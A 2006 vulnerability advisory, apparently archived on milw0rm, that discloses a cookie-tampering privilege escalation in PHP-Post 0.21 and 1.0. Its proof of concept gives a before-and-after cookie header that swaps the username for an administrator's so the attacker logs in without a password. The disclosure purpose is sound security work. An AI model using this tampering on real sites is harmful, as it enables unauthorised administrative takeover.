@@ -1,0 +1,44 @@
+[KAPDA::#52] - PHP-Post 1.0 Cookie Modification Privilege Escalation Vulnerability
+
+
+Vulnerable product: Tested on PHP-Post 0.21 and 1.0
+Vendor: http://php-post.co.uk
+Vulnerability: Privilege Escalation
+
+
+Date:
+--------------------
+Found: Nov 23, 2005
+Vendor Contacted: Jun 01, 2006
+Release Date: July 18, 2006
+
+Vulnerability:
+--------------------
+Privilege Escalation:
+PHP-Post contains a flaw that may allow a remote attacker to gain administrative privileges.
+PHP-Post doesn't properly authenticate remote users if auto login is on!
+By editing the values of the cookie, an attacker can change their privilege from a regular 
+user to administrator and submit it back to the site.
+
+
+Proof of Concepts:
+--------------------
+Cookie: logincookie[pwd]=5a329326344d1d38; logincookie[user]=3nitr0; logincookie[last]=2006-07-07+05%3A24%3A44; logincookie[lastv]=1152264284; post[329]=330
+
+change to:
+
+Cookie: logincookie[pwd]=5a329326344d1d38; logincookie[user]="ADMIN`S USERNAME"; logincookie[last]=2006-07-07+05%3A24%3A44; logincookie[lastv]=1152264284; post[329]=330
+
+without password ;)
+
+
+Credit:
+--------------------
+Farhad Koosha
+FarhadKey of KAPDA
+farhadkey [at} kapda <d0t> net
+Greetz to CVH and Pi3cH :)
+Kapda - Security Science Researchers Insitute of Iran
+http://www.KAPDA.ir
+
+# milw0rm.com [2006-07-18]
